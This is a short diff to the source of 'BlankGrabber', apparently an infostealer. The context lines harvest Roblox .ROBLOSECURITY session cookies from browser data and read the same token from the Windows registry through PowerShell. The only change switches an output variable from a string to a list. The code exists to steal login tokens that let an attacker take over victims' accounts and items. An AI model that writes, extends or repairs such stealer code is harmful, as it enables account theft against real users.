@@ -837,7 +837,7 @@ class BlankGrabber:
         for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
             self.RobloxCookies.append(match)
         
-        output = str()
+        output = list()
         for item in ('HKCU', 'HKLM'):
             process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output= True, shell= True)
             if not process.returncode:
